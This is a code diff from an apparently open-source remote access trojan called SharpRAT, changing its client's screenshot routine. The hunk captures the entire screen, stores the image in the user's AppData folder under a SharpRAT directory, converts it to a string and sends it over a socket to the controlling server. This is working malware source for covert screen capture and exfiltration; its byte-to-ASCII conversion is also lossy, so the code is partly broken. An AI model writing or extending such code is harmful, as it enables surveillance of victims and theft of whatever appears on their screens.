@@ -67,20 +67,24 @@ namespace Client.Client
                 Graphics memoryGraphics = Graphics.FromImage(bitmap);
 
                 memoryGraphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
-
+                
                 //That's it! Save the image in the directory and this will work like charm.  
                 string fileName = string.Format(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\SharpRAT\screenshot\Screenshot" + "_" + DateTime.Now.ToString("(dd_MMMM_hh_mm_ss_tt)") + ".png");
 
-                // save it  
+                //bitmap saved as picture in jpg form.
                 bitmap.Save(fileName);
                 MemoryStream ms = new MemoryStream();
                 bitmap.Save(ms, System.Drawing.Imaging.ImageFormat.Bmp);
+                //bitmap saved as byte array
                 byte[] b = ms.ToArray();
-                Debug.WriteLine($"{b}");
-                Main.socketClient.GetServerSocket().Send(Encoding.ASCII.GetBytes("<SCREENSHOT>"+ b +"<EOF>"));
+                ms.Close();
+                //resulting byte array is turned into string
+                string result = System.Text.Encoding.ASCII.GetString(b);
+                //Debug.WriteLine($"{result}");
+                Main.socketClient.GetServerSocket().Send(Encoding.ASCII.GetBytes("<SCREENSHOT>"+ result +"</SCREENSHOT> <EOF>"));
                 //GetServerSocket().Send(Encoding.ASCII.GetBytes($"{ b}"));
                 //GetServerSocket().Send(Encoding.ASCII.GetBytes("<EOF>"));
-                ms.Close();
+                
                 Debug.WriteLine("sent data back");
             }
         }
